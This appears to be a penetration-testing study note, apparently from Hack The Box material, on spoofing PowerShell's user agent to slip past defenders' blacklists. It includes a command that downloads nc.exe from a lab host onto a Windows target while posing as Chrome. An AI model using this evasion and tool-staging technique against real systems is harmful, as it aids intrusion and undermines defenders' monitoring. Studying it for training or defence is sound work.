# File Transfers
## @Author : M3tr1c_r00t
### Avoiding Detection
#### Changing User Agent
If diligent administrators or defenders have blacklisted any of these User Agents, Invoke-WebRequest contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate.

Listing User agents
```
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```
Requesting using Chrome User Agent
```
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "C:\Users\Public\nc.exe"
```
#### LOLBAS/GTFOBins
![image](https://user-images.githubusercontent.com/99975622/222994158-1b1705fb-d213-474e-95f7-54a10ea89587.png)

## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
